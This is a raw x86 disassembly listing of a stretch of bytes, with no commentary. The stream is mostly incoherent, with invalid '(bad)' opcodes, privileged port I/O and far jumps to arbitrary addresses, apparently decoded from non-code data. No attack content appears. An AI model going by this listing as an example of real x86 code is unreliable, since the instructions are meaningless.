  41e2dc:	and    al,BYTE PTR [edi+0x2b]
  41e2df:	inc    esi
  41e2e0:	inc    edi
  41e2e1:	fist   DWORD PTR [eax+0x12]
  41e2e4:	shl    BYTE PTR [edi+0x49c0e145],0x85
  41e2eb:	stc    
  41e2ec:	cs pop edx
  41e2ee:	pop    ds
  41e2ef:	jns    0x41e283
  41e2f1:	mov    al,ds:0xb6256fe6
  41e2f6:	mov    dh,0x9d
  41e2f8:	and    edi,esp
  41e2fa:	call   0x481c:0xe4e7c23f
  41e301:	mov    BYTE PTR [eax],ah
  41e303:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e304:	jnp    0x41e2bf
  41e306:	sbb    BYTE PTR [eax+edi*4],ch
  41e309:	cdq    
  41e30a:	fcomp  QWORD PTR [ebx-0x730bc2a3]
  41e310:	xor    al,0x1b
  41e312:	jmp    0x8b19:0x58cd8e73
  41e319:	push   eax
  41e31a:	in     al,0x5
  41e31c:	and    BYTE PTR [ebp-0x37],0x61
  41e320:	iret   
  41e321:	daa    
  41e322:	dec    edi
  41e323:	jbe    0x41e2d2
  41e325:	retf   0x4f0c
  41e328:	and    al,0xdc
  41e32a:	mov    bh,0xc9
  41e32c:	call   0xd17e:0xda8a325e
  41e333:	imul   esp,DWORD PTR [ebx],0x74
  41e336:	cwde   
  41e337:	push   esp
  41e338:	mov    bl,0x29
  41e33a:	fist   WORD PTR [ecx+0xb]
  41e33d:	xchg   ecx,eax
  41e33e:	ds xor eax,0xfe72c570
  41e344:	rol    DWORD PTR [ebp-0x74f056a9],0x22
  41e34b:	imul   eax,DWORD PTR [edi+0x14],0xe4b23fa8
  41e352:	imul   eax,DWORD PTR ds:0xc4026316,0xaee769ca
  41e35c:	outs   dx,DWORD PTR ds:[esi]
  41e35d:	xchg   edi,eax
  41e35e:	ins    BYTE PTR es:[edi],dx
  41e35f:	sbb    BYTE PTR [edi+0x64],bl
  41e362:	push   edi
  41e363:	push   cs
  41e364:	push   cs
  41e365:	push   ebp
  41e366:	pushf  
  41e367:	call   0x6d7f1f7b
  41e36c:	sar    ebp,cl
  41e36e:	sub    eax,0xb8408458
  41e373:	inc    eax
  41e374:	sub    bh,BYTE PTR [edi]
  41e376:	mov    WORD PTR ds:0xa45a735e,ss
  41e37c:	jecxz  0x41e3ee
  41e37e:	ss push eax
  41e380:	mov    al,0xce
  41e382:	xchg   esp,eax
  41e383:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e384:	pushf  
  41e385:	mov    al,ds:0x16c8ce7a
  41e38a:	test   eax,0x77023723
  41e38f:	mov    ecx,0x145beedb
  41e394:	sbb    al,0xf6
  41e396:	out    0x5f,eax
  41e398:	xchg   ecx,eax
  41e399:	sub    al,0xc5
  41e39b:	stos   BYTE PTR es:[edi],al
  41e39c:	(bad)  
  41e39e:	adc    edi,DWORD PTR [esp+edi*1]
  41e3a1:	jnp    0x41e39b
  41e3a3:	ins    BYTE PTR es:[edi],dx
  41e3a4:	scas   al,BYTE PTR es:[edi]
  41e3a5:	cli    
  41e3a6:	mov    cl,0xb4
  41e3a8:	sti    
  41e3a9:	popa   
  41e3aa:	jmp    0xd60:0x3332a2b6
  41e3b1:	adc    al,0x42
  41e3b3:	and    eax,0x55739cf
  41e3b8:	jcxz   0x41e3d2
  41e3bb:	dec    ebx
  41e3bc:	xor    eax,DWORD PTR [eax-0x344a290a]
  41e3c2:	and    BYTE PTR [edx+eax*8-0x26],0xd
  41e3c7:	mov    fs,WORD PTR [ebx-0x1e098502]
  41e3cd:	jb     0x41e42b
  41e3cf:	rcl    bh,1
  41e3d1:	mov    dh,al
  41e3d3:	pop    ebx
  41e3d4:	add    BYTE PTR [esi],ah
  41e3d6:	or     al,0x90
  41e3d8:	sbb    eax,ecx
  41e3da:	jmp    0xdac79ebe
  41e3df:	add    al,0x9f
  41e3e1:	std    
  41e3e2:	fmulp  st(0),st
  41e3e4:	rcr    DWORD PTR [ecx],cl
  41e3e6:	inc    edx
  41e3e7:	sub    esi,DWORD PTR [edi+0x6a]
  41e3ea:	pop    edi
  41e3eb:	fcom   st(2)
  41e3ed:	push   es
  41e3ee:	es adc al,0x31
  41e3f1:	int3   
  41e3f2:	push   edi
  41e3f3:	inc    ebp
  41e3f4:	sbb    esp,DWORD PTR ds:0xcb4cb7aa
  41e3fa:	stos   DWORD PTR es:[edi],eax
  41e3fb:	scas   al,BYTE PTR es:[edi]
  41e3fc:	mov    eax,ds:0x6a753861
  41e401:	(bad)  
  41e403:	popf   
  41e404:	push   ds
  41e405:	xor    al,0xb8
  41e407:	outs   dx,DWORD PTR ds:[esi]
  41e408:	repz fild QWORD PTR [ebx]
  41e40b:	retf   
  41e40c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e40d:	mov    ds:0x100bbcc3,eax
  41e412:	imul   ecx,eax,0xb7c406a3
  41e418:	xchg   ecx,eax
  41e419:	add    eax,0x7b54a69e
  41e41e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e41f:	xchg   edx,eax
  41e420:	(bad)  
  41e421:	jbe    0x41e474
  41e423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e424:	enter  0xd5ee,0x88
  41e428:	out    0x7d,eax
  41e42a:	inc    edi
  41e42b:	cld    
  41e42c:	push   ss
  41e42d:	mov    bh,0xe7
  41e42f:	data16 xchg BYTE PTR [edi+0x8b9e95f],bh
  41e436:	outs   dx,BYTE PTR ds:[esi]
  41e437:	add    DWORD PTR [eax-0x3a],0xffffff87
  41e43b:	out    dx,al
  41e43c:	jbe    0x41e49f
  41e43e:	xchg   esp,eax
  41e43f:	lea    ebp,[edi+esi*4]
  41e442:	xor    dh,dh
  41e444:	jmp    0xf408cee1
  41e449:	fwait
  41e44a:	pop    ebx
  41e44b:	jno    0x41e491
  41e44d:	adc    eax,0xf9fb9416
  41e452:	pop    esi
  41e453:	stc    
  41e454:	mov    BYTE PTR [esp+eax*1+0x26],cl
  41e458:	push   ecx
  41e459:	stc    
  41e45a:	add    cl,bh
  41e45c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e45d:	sar    al,cl
  41e45f:	mov    ch,0xd8
  41e461:	idiv   BYTE PTR [ebx+0x760bf2bb]
  41e467:	pop    ss
  41e468:	sub    DWORD PTR [ecx-0x39],ecx
  41e46b:	sbb    DWORD PTR [esi-0x3d],0x7d
  41e46f:	inc    eax
  41e470:	js     0x41e493
  41e472:	stos   DWORD PTR es:[edi],eax
  41e473:	std    
  41e474:	shr    DWORD PTR [eax-0x5a2304bf],cl
  41e47a:	or     al,0xc8
  41e47c:	push   ebp
  41e47d:	fwait
  41e47e:	sbb    BYTE PTR [edx+0x61ea302e],ch
  41e484:	push   ds
  41e485:	inc    esp
  41e486:	retf   0x577
  41e489:	xchg   ebx,eax
  41e48a:	aam    0xc6
  41e48c:	jmp    0x66e5:0x5d029963
  41e493:	or     DWORD PTR [edi-0x7c],edx
  41e496:	jge    0x41e46f
  41e498:	into   
  41e499:	mov    edi,0xe7408af0
  41e49e:	dec    esi
  41e49f:	xchg   esi,eax
  41e4a0:	inc    edi
  41e4a1:	add    esi,ecx
  41e4a3:	ins    BYTE PTR es:[edi],dx
  41e4a4:	push   ecx
  41e4a5:	sbb    bh,bh
  41e4a7:	loopne 0x41e448
  41e4a9:	xor    dl,dl
  41e4ab:	pop    esi
  41e4ac:	xor    esp,edi
  41e4ae:	dec    edi
  41e4af:	sub    DWORD PTR [esi+0x410ee435],0x5
  41e4b6:	loopne 0x41e49f
  41e4b8:	jmp    0xd6eaa627
  41e4bd:	hlt    
  41e4be:	pop    ecx
  41e4bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4c0:	cdq    
  41e4c1:	jecxz  0x41e465
  41e4c3:	add    eax,0xed764971
  41e4c8:	lods   al,BYTE PTR ds:[esi]
  41e4c9:	adc    al,0xd7
  41e4cb:	dec    esi
  41e4cc:	sub    esi,esp
  41e4ce:	in     eax,0x48
  41e4d0:	sbb    BYTE PTR [edx-0x1b9aab27],ch
  41e4d6:	pop    ebx
  41e4d7:	dec    edx
  41e4d8:	fisttp QWORD PTR [ebx+0x6c12a4c5]
  41e4de:	jae    0x41e505
  41e4e0:	fldcw  WORD PTR [ebx+0x1f]
  41e4e3:	inc    eax
  41e4e4:	mov    eax,0x87486966
  41e4e9:	test   DWORD PTR [ecx+ebx*2-0xd],esi
  41e4ed:	cs fwait
  41e4ef:	dec    DWORD PTR [eax]
  41e4f1:	ss dec ebx
  41e4f3:	inc    DWORD PTR [esp-0x30]
  41e4f7:	mov    ecx,0xe47e0e3c
  41e4fc:	adc    edi,ebp
  41e4fe:	sahf   
  41e4ff:	xor    BYTE PTR [eax-0x53],al
  41e502:	jo     0x13901b2e
  41e508:	(bad)  
  41e509:	int3   
  41e50a:	add    DWORD PTR [ebp-0xd00bd3d],0xffffffc8
  41e511:	sub    al,0x3d
  41e513:	into   
  41e514:	pusha  
  41e515:	mov    eax,0xecf71fdf
  41e51a:	cmp    dl,cl
  41e51c:	int3   
  41e51d:	(bad)  
  41e51e:	in     al,0x69
  41e520:	mov    eax,DWORD PTR [ebx-0x40]
  41e523:	push   0xb753098
  41e528:	test   al,0xe6
  41e52a:	jp     0x41e57e
  41e52c:	fwait
  41e52d:	xor    al,0xe8
  41e52f:	xchg   ebp,eax
  41e530:	mov    bh,0xe6
  41e532:	xchg   BYTE PTR [eax],bh
  41e534:	test   al,0x3b
  41e536:	fadd   QWORD PTR [ecx+0x51]
  41e539:	pop    ebp
  41e53a:	fadd   st(1),st
  41e53c:	mov    edx,0xca4bc8e
  41e541:	sbb    DWORD PTR [ebp+0x9],ebx
  41e544:	in     al,dx
  41e545:	enter  0xb5d8,0xf5
  41e549:	dec    eax
  41e54a:	sbb    cl,BYTE PTR [edi]
  41e54c:	add    eax,0xc27c45b
  41e551:	jle    0x41e5c5
  41e553:	jbe    0x41e53b
  41e555:	add    ebx,DWORD PTR [ebx+edi*2]
  41e558:	pop    ecx
  41e559:	lods   al,BYTE PTR ds:[esi]
  41e55a:	mov    WORD PTR [edx-0x65],es
  41e55d:	and    bh,dl
  41e55f:	aaa    
  41e560:	sub    bh,BYTE PTR [eax+0x2d032c52]
  41e566:	lock inc esp
  41e568:	(bad)  
  41e569:	mov    ?,WORD PTR [eax]
  41e56b:	jns    0x41e5d9
  41e56d:	mov    dh,0x51
  41e56f:	(bad)  
  41e571:	aas    
  41e572:	cwde   
  41e573:	lahf   
  41e574:	scas   eax,DWORD PTR es:[edi]
  41e575:	xchg   edx,eax
  41e576:	jmp    0x41e507
  41e578:	adc    eax,0x16ddd8c9
  41e57d:	jg     0x41e59f
  41e57f:	push   edi
  41e580:	int    0x53
  41e582:	pop    ebx
  41e583:	push   cs
  41e584:	or     al,0xc3
  41e586:	(bad)
  41e58a:	or     eax,0x96b77ecb
  41e58f:	mov    dl,0x52
  41e591:	scas   al,BYTE PTR es:[edi]
  41e592:	mov    dh,0xa2
  41e594:	jp     0x41e5bc
  41e596:	int3   
  41e597:	ret    
  41e598:	add    eax,0xd01785e4
  41e59d:	mov    al,ds:0xe6b765f5
  41e5a2:	push   ecx
  41e5a3:	cmc    
  41e5a4:	add    al,0x67
  41e5a6:	dec    edi
  41e5a7:	out    dx,eax
  41e5a8:	bound  ecx,QWORD PTR [edi]
  41e5aa:	or     al,0xf
  41e5ac:	sbb    bl,cl
  41e5ae:	adc    cl,BYTE PTR [ebx+0x7c]
  41e5b1:	dec    ebx
  41e5b2:	mov    dh,0xc6
  41e5b4:	neg    DWORD PTR [esi+ebx*4+0x1bd9efc6]
  41e5bb:	repnz pop ebx
  41e5bd:	cmp    ebp,edi
  41e5bf:	and    dh,ah
  41e5c1:	stc    
  41e5c2:	aas    
  41e5c3:	sub    al,0x56
  41e5c5:	sbb    al,0xb9
  41e5c7:	inc    edi
  41e5c8:	out    dx,al
  41e5c9:	mov    ah,ah
  41e5cb:	dec    ebx
  41e5cc:	inc    eax
  41e5cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5ce:	sti    
  41e5cf:	icebp  
  41e5d0:	or     esp,ebx
  41e5d2:	adc    ebp,ebx
  41e5d4:	sub    DWORD PTR [edx],0x1f
  41e5d7:	pop    esi
  41e5d8:	out    dx,al
  41e5d9:	mov    fs,WORD PTR [ebp+eiz*4-0x6486cc90]
  41e5e0:	adc    dl,cl
  41e5e2:	xchg   esp,eax
  41e5e3:	pop    ds
  41e5e4:	adc    al,0xf7
  41e5e6:	call   ecx
  41e5e8:	lock mov edi,DWORD PTR ss:[ecx]
  41e5ec:	cmp    BYTE PTR [ebx+0x1b],0xe0
  41e5f0:	sbb    eax,0x8cdb4490
  41e5f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5f6:	pop    ds
  41e5f7:	jne    0x41e60b
  41e5f9:	mov    ?,WORD PTR [esi-0x184048bf]
  41e5ff:	(bad)  
  41e600:	int3   
  41e601:	jae    0x41e5ba
  41e603:	jl     0x41e618
  41e605:	adc    al,0xb1
  41e607:	mov    eax,0xd882dae8
  41e60c:	sbb    eax,esp
  41e60e:	cmp    eax,0x3d795d01
  41e613:	lods   al,BYTE PTR ds:[esi]
  41e614:	push   ss
  41e615:	adc    DWORD PTR [esi+0x3a],ecx
  41e618:	push   cs
  41e619:	test   al,0x36
  41e61b:	mov    BYTE PTR [edi+ebp*4],dl
  41e61e:	enter  0x7a97,0x81
  41e622:	pop    ds
  41e623:	mov    esp,ds
  41e625:	sti    
  41e626:	xor    cl,BYTE PTR ds:0x65a0c4f1
  41e62c:	jge    0x41e5c4
  41e62e:	stc    
  41e62f:	mov    ecx,0x81e1d084
  41e634:	inc    ebp
  41e635:	adc    BYTE PTR [esi+0x28b72a9e],bl
  41e63b:	inc    bp
  41e63d:	or     BYTE PTR [eax-0x1e7b6e5c],bh
  41e643:	xchg   ebx,edx
  41e645:	(bad)  
  41e646:	mov    ch,0x8c
  41e648:	bound  esp,QWORD PTR [edx-0x1f3788ad]
  41e64e:	test   al,0xc
  41e650:	mov    ebx,0x148531f
  41e655:	push   esi
  41e656:	jmp    0xe74f:0x654a7367
  41e65d:	lea    edi,[edx]
  41e65f:	arpl   WORD PTR [eax-0x111a8dd6],bx
  41e665:	and    esi,eax
  41e667:	outs   dx,DWORD PTR ds:[esi]
  41e668:	jbe    0x41e69f
  41e66a:	pop    ebp
  41e66b:	xor    DWORD PTR [bx-0x21e6],edx
  41e670:	dec    esp
  41e671:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e672:	out    0x3c,al
  41e674:	mov    cl,0xba
  41e676:	and    esi,ebx
  41e678:	xchg   ebp,eax
  41e679:	(bad)  
  41e67a:	pop    ds
  41e67b:	mov    bl,0xf4
  41e67d:	sub    eax,0xf5555f02
  41e682:	nop
  41e683:	adc    al,BYTE PTR [esi+0xf]
  41e686:	int    0xff
  41e688:	jbe    0x41e674
  41e68a:	xchg   esp,eax
  41e68b:	or     eax,0x7c09dd4d
  41e690:	xchg   edx,eax
  41e691:	scas   eax,DWORD PTR es:[edi]
  41e692:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e693:	daa    
  41e694:	imul   ebp,DWORD PTR [edi+ecx*1-0x12],0x389a1bca
  41e69c:	sbb    ah,BYTE PTR ds:0xf0ad8d93
  41e6a2:	mov    esi,0x1c30b4fc
  41e6a7:	jbe    0x41e657
  41e6a9:	test   al,0x4b
  41e6ab:	shl    ebp,0x6
  41e6ae:	cld    
  41e6af:	clc    
  41e6b0:	data16 lahf 
  41e6b2:	lds    ecx,FWORD PTR [edx+0x7b]
  41e6b5:	icebp  
  41e6b6:	pusha  
  41e6b7:	mov    eax,ss:0xac7b7578
  41e6bd:	gs mov eax,0x719040
  41e6c3:	enter  0xce6f,0xda
  41e6c7:	jmp    0x2c25b9fa
  41e6cc:	mov    dh,0xe3
  41e6ce:	imul   ecx,DWORD PTR [edx+0x2b],0x57
  41e6d2:	mov    ?,WORD PTR [edi+0x2789c51e]
  41e6d8:	push   ax
  41e6da:	in     eax,0x11
  41e6dc:	test   DWORD PTR [edx],esi
  41e6de:	xor    ah,BYTE PTR [ebx+0x4c]
  41e6e1:	xchg   edx,eax
  41e6e2:	mov    ch,0x40
  41e6e4:	call   0xce94fad1
  41e6e9:	rol    cl,cl
  41e6eb:	mov    eax,ds:0xaae74d96
  41e6f0:	ret    0x3385
  41e6f3:	mov    ebx,0xb069c087
  41e6f8:	mov    dh,0x90
  41e6fa:	std    
  41e6fb:	mov    ?,WORD PTR [eax+0x6a]
  41e6fe:	rcr    DWORD PTR [ebx+0x7a],1
  41e701:	jl     0x41e6b8
  41e703:	(bad)  
  41e704:	or     esi,ecx
  41e706:	aam    0xc5
  41e708:	adc    ah,cl
  41e70a:	daa    
  41e70b:	data16 fld QWORD PTR [ebp+0x6]
  41e70f:	xor    eax,DWORD PTR [esi+eax*2]
  41e712:	pop    ecx
  41e713:	pop    eax
  41e714:	out    dx,eax
  41e715:	jmp    FWORD PTR [ebx-0x6]
  41e718:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e719:	jnp    0x41e735
  41e71b:	cmp    BYTE PTR [edi+0x65],0x42
  41e71f:	xor    eax,0x44e8a404
  41e724:	push   ebx
  41e725:	fcom   QWORD PTR [esi+0x86c5dbb]
  41e72b:	int    0xcd
  41e72d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e72e:	nop
  41e72f:	adc    DWORD PTR [ebx],ecx
  41e731:	mov    cl,0x91
  41e733:	lods   eax,DWORD PTR ds:[esi]
  41e734:	lea    edx,[ebx+esi*4+0x239c2cb5]
  41e73b:	mov    cl,0x25
  41e73d:	pop    ds
  41e73e:	jge    0x41e753
  41e740:	loop   0x41e7a5
  41e742:	jbe    0x41e73d
  41e744:	adc    eax,0x6e57cfc2
  41e749:	daa    
  41e74a:	add    dh,dl
  41e74c:	dec    ebp
  41e74d:	jge    0x41e6ed
  41e74f:	nop
  41e750:	push   ss
  41e751:	daa    
  41e752:	sbb    BYTE PTR [ebp-0x63c688d0],0xe2
  41e759:	ins    DWORD PTR es:[edi],dx
  41e75a:	xchg   ecx,eax
  41e75b:	int    0x5
  41e75d:	rcl    DWORD PTR [eax-0x15],0x77
  41e761:	mov    edi,0xc82034f6
  41e766:	dec    ebp
  41e767:	xchg   esi,eax
  41e768:	(bad)  [ebx+esi*8]
  41e76b:	pop    eax
  41e76c:	out    dx,eax
  41e76d:	dec    ebp
  41e76e:	sub    ebp,DWORD PTR ds:0xd2c3fb93
  41e774:	outs   dx,BYTE PTR ds:[esi]
  41e775:	adc    al,0xb1
  41e777:	push   ss
  41e778:	lahf   
  41e779:	xor    BYTE PTR [ebx],ah
  41e77b:	outs   dx,DWORD PTR ds:[esi]
  41e77c:	push   0x6ec1a07d
  41e781:	add    DWORD PTR [esp-0x7c],eax
  41e785:	adc    al,0x1f
  41e787:	shr    DWORD PTR [ebp+0x378bacd0],1
  41e78d:	out    dx,al
  41e78e:	pop    esi
  41e78f:	or     BYTE PTR [ecx],0xa2
  41e792:	call   0xa415f4bc
  41e797:	sbb    al,ah
  41e799:	push   ecx
  41e79a:	aam    0x3d
  41e79c:	mov    edi,eax
  41e79e:	push   ebp
  41e79f:	push   edi
  41e7a0:	push   0x8fad0756
  41e7a5:	mov    edx,DWORD PTR [ebx-0x5d]
  41e7a8:	mov    es,WORD PTR [ebx+0x70]
  41e7ab:	jo     0x41e748
  41e7ad:	jo     0x41e82d
  41e7af:	inc    eax
  41e7b0:	repz jp 0x41e82e
  41e7b3:	cld    
  41e7b4:	(bad)  
  41e7b5:	push   ds
  41e7b6:	iret   
  41e7b7:	daa    
  41e7b8:	cmc    
  41e7b9:	xchg   ah,ch
  41e7bb:	scas   al,BYTE PTR es:[edi]
  41e7bc:	out    dx,al
  41e7bd:	cmp    BYTE PTR ds:[ebx-0x66073932],bl
  41e7c4:	outs   dx,DWORD PTR ds:[esi]
  41e7c5:	icebp  
  41e7c6:	sbb    eax,0x1d9daff4
  41e7cb:	scas   al,BYTE PTR es:[edi]
  41e7cc:	mov    eax,0x515e1835
  41e7d1:	or     bh,bh
  41e7d3:	adc    dh,BYTE PTR [eax+0x7b]
  41e7d6:	imul   eax,DWORD PTR ds:0xa08d22ca,0xffffffb8
  41e7dd:	outs   dx,DWORD PTR ds:[esi]
  41e7de:	lahf   
  41e7df:	das    
  41e7e0:	cmp    ebp,DWORD PTR [ecx]
  41e7e2:	add    ecx,DWORD PTR ds:0x5232f49f
  41e7e8:	pop    esi
  41e7e9:	jnp    0x41e7e5
  41e7eb:	jp     0x41e818
  41e7ed:	dec    eax
  41e7ee:	mov    esi,0x1d06935
  41e7f3:	lds    ebx,FWORD PTR [eax]
  41e7f5:	pop    es
  41e7f6:	xor    BYTE PTR [ecx],dl
  41e7f8:	or     al,0x4e
  41e7fa:	push   0xffffff99
  41e7fc:	popf   
  41e7fd:	push   edi
  41e7fe:	push   es
  41e7ff:	(bad)  
  41e800:	ds lahf 
  41e802:	xor    cl,BYTE PTR [ecx+0x2b9fd12b]
  41e808:	arpl   ax,bx
  41e80a:	dec    esp
  41e80b:	enter  0x833c,0x2c
  41e80f:	gs pushw cs
  41e812:	outs   dx,BYTE PTR ds:[esi]
  41e813:	inc    esp
  41e814:	lods   al,BYTE PTR ds:[esi]
  41e815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e816:	xchg   edi,eax
  41e817:	push   es
  41e818:	in     eax,dx
  41e819:	sbb    ecx,DWORD PTR [ebp-0x6c]
  41e81c:	mov    ds:0x4e5cdf7a,eax
  41e821:	rcr    ecx,cl
  41e823:	mov    ebp,0x3b9134c9
  41e828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e829:	ds mov edi,0x27589644
  41e82f:	pop    esi
  41e830:	mov    WORD PTR ds:0x7f0c0cf7,ds
  41e836:	aam    0x14
  41e838:	push   sp
  41e83a:	popf   
  41e83b:	cmp    dh,dh
  41e83d:	jb     0x41e83c
  41e83f:	fs scas al,BYTE PTR es:[edi]
  41e841:	inc    edi
  41e842:	xchg   DWORD PTR [edx-0x69],ebx
  41e845:	cmp    DWORD PTR [ebx-0x4b],ebp
  41e848:	sub    ebx,DWORD PTR [edx]
  41e84a:	iret   
  41e84b:	ss xchg ecx,eax
  41e84d:	daa    
  41e84e:	int3   
  41e84f:	adc    al,0x3a
  41e851:	scas   al,BYTE PTR es:[edi]
  41e852:	adc    eax,0x4d7b33bf
  41e857:	sbb    edx,DWORD PTR [ecx+0x8]
  41e85a:	xchg   esi,eax
  41e85b:	ficom  WORD PTR [eax-0x2c6eab92]
  41e861:	test   al,0xbc
  41e863:	in     eax,0x6c
  41e865:	and    eax,0x6f7d3257
  41e86a:	jnp    0x41e891
  41e86c:	paddd  mm6,QWORD PTR [edx]
  41e86f:	jns    0x41e811
  41e871:	retf   0xd80f
  41e874:	aaa    
  41e875:	jle    0x41e813
  41e877:	push   esp
  41e878:	dec    esp
  41e879:	nop
  41e87a:	call   0xb5a982f5
  41e87f:	ds xchg ebx,eax
  41e881:	mov    ecx,0x50e8ae3d
  41e886:	loopne 0x41e8c2
  41e888:	push   ebp
  41e889:	push   ebx
  41e88a:	fdiv   QWORD PTR [esi]
  41e88c:	add    eax,0x1df0292
  41e891:	dec    ebp
  41e892:	fwait
  41e893:	pop    edx
  41e894:	mov    ds:0x71bb3afc,al
  41e899:	sti    
  41e89a:	into   
  41e89b:	push   edi
  41e89c:	pusha  
  41e89d:	mov    al,0x88
  41e89f:	xor    eax,0x26f5cfae
  41e8a4:	outs   dx,DWORD PTR ds:[esi]
  41e8a5:	jge    0x41e853
  41e8a7:	scas   al,BYTE PTR es:[edi]
  41e8a8:	push   ebx
  41e8a9:	xor    DWORD PTR [edx+0x365f82bf],esp
  41e8af:	cmp    eax,0xa2a62c9a
  41e8b4:	ds or  eax,0xd963f6dd
  41e8ba:	mov    dh,0x5f
  41e8bc:	and    DWORD PTR [edi+0x7a],ebx
  41e8bf:	aam    0x7e
  41e8c1:	jle    0x41e885
  41e8c3:	mov    dh,0xa0
  41e8c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8c6:	pop    ecx
  41e8c7:	dec    ecx
  41e8c8:	test   ah,ch
  41e8ca:	hlt    
  41e8cb:	mov    dh,0x3a
  41e8cd:	push   ebp
  41e8ce:	or     edx,DWORD PTR [edi+0x694b6cfc]
  41e8d4:	add    esi,DWORD PTR [edx+ebx*8+0x35200d17]
  41e8db:	ror    al,0xca
  41e8de:	mov    bh,0x5c
  41e8e0:	xor    dl,BYTE PTR [ebp+0x2adde94b]
  41e8e6:	mov    ebp,0x965cfe0c
  41e8eb:	mov    esp,0x44cf796d
  41e8f0:	daa    
  41e8f1:	cmp    esi,esi
  41e8f3:	and    eax,0x6db8c1ed
  41e8f8:	imul   ebp,ebx,0xc6d25e22
  41e8fe:	and    ebx,DWORD PTR [esi-0xb]
  41e901:	sbb    bl,ah
  41e903:	adc    ebp,ecx
  41e905:	sub    al,0xa1
  41e907:	in     al,dx
  41e908:	sbb    BYTE PTR [edi],ah
  41e90a:	push   ds
  41e90b:	xor    DWORD PTR [ebx-0x68],0x6d
  41e90f:	inc    eax
  41e910:	scas   eax,DWORD PTR es:[edi]
  41e911:	(bad)  
  41e912:	bound  edi,QWORD PTR [ebp+0x78]
  41e915:	sbb    al,0x1d
  41e917:	outs   dx,BYTE PTR ds:[esi]
  41e918:	xor    BYTE PTR [edi],ch
  41e91a:	push   ds
  41e91b:	out    0xa,al
  41e91d:	inc    esi
  41e91e:	fwait
  41e91f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e920:	cld    
  41e921:	into   
  41e922:	push   es
  41e923:	dec    ebp
  41e924:	jle    0x41e9a3
  41e926:	je     0x41e94b
  41e928:	scas   al,BYTE PTR es:[edi]
  41e929:	mov    BYTE PTR fs:[eax],ah
  41e92c:	sbb    DWORD PTR [edi],ebx
  41e92e:	push   eax
  41e92f:	sub    BYTE PTR [edx],dh
  41e931:	dec    eax
  41e932:	add    eax,0xa41d929e
  41e937:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e938:	xlat   BYTE PTR ds:[ebx]
  41e939:	xchg   edx,eax
  41e93a:	inc    ecx
  41e93b:	retf   0x994a
  41e93e:	ja     0x41e96b
  41e940:	xor    bl,ah
  41e942:	repnz ins DWORD PTR es:[edi],dx
  41e944:	rcl    ch,0x1f
  41e947:	out    0x4e,eax
  41e949:	jae    0x41e9ac
  41e94b:	shl    edi,1
  41e94d:	fist   WORD PTR [eax]
  41e94f:	aad    0xd0
  41e951:	mov    ecx,DWORD PTR [ecx]
  41e953:	pop    edi
  41e954:	out    dx,eax
  41e955:	dec    esi
  41e956:	pop    esi
  41e957:	int    0xf7
  41e959:	adc    al,BYTE PTR [edx*4-0x39c32694]
  41e960:	js     0x41e985
  41e962:	rcl    BYTE PTR [eax+0x64],cl
  41e965:	fadd   st,st(4)
  41e967:	mov    edi,0xf8f5fc88
  41e96c:	or     ebx,DWORD PTR [esi+ebp*1+0x1a4ea0ce]
  41e973:	xchg   dl,bh
  41e975:	retf   0x4b0d
  41e978:	nop
  41e979:	cmc    
  41e97a:	je     0x41e9f5
  41e97c:	es test esi,esp
  41e97f:	jbe    0x41e9e8
  41e981:	pop    ds
  41e982:	inc    eax
  41e983:	lods   al,BYTE PTR ds:[esi]
  41e984:	adc    edx,esi
  41e986:	xchg   esi,eax
  41e987:	inc    ecx
  41e988:	xchg   esp,eax
  41e989:	cmp    dl,BYTE PTR [ecx-0x783e4d3]
  41e98f:	mov    fs,ecx
  41e991:	iret   
  41e992:	inc    ecx
  41e993:	js     0x41e915
  41e995:	inc    eax
  41e996:	cmp    dl,al
  41e998:	jns    0x41e950
  41e99a:	pushf  
  41e99b:	int3   
  41e99c:	inc    edx
  41e99d:	inc    esi
  41e99e:	and    DWORD PTR ds:0xcdc99464,esp
  41e9a4:	(bad)  
  41e9a5:	(bad)  
  41e9a6:	jl     0x41e986
  41e9a8:	and    ecx,esp
  41e9aa:	mov    ebx,0x580624b4
  41e9af:	inc    esp
  41e9b0:	les    esp,FWORD PTR [edx-0x4c]
  41e9b3:	adc    DWORD PTR [edx],esp
  41e9b5:	jmp    0xd24a:0xc485c6e7
  41e9bc:	mov    WORD PTR [ebx+eiz*2],bx
  41e9c0:	xor    eax,eax
  41e9c2:	neg    BYTE PTR [ebx]
  41e9c4:	popf   
  41e9c5:	not    DWORD PTR [ebp+0x42978262]
  41e9cb:	xchg   ebx,eax
  41e9cc:	pushf  
  41e9cd:	cld    
  41e9ce:	dec    ebx
  41e9cf:	or     DWORD PTR [edx+0x3a9afd44],edi
  41e9d5:	push   edi
  41e9d6:	js     0x41ea3d
  41e9d8:	retf   
  41e9d9:	iret   
  41e9da:	sub    eax,0x7c27713
  41e9df:	shr    BYTE PTR [edx-0x65218c84],0x4a
  41e9e6:	pop    es
  41e9e7:	call   0x13ed4010
  41e9ec:	ret    0x25ab
  41e9ef:	jnp    0x41e975
  41e9f1:	mov    cl,0xa8
  41e9f3:	ins    BYTE PTR es:[edi],dx
  41e9f4:	jecxz  0x41e9aa
  41e9f6:	or     DWORD PTR [ebp+0x21],eax
  41e9f9:	sbb    eax,0x74824571
  41e9fe:	sbb    DWORD PTR [edi],eax
  41ea00:	call   DWORD PTR [ecx+0x6]
  41ea03:	hlt    
  41ea04:	xor    eax,0x34e47309
  41ea09:	rcr    DWORD PTR [ebx],0xf5
  41ea0c:	xchg   ebp,eax
  41ea0d:	out    dx,eax
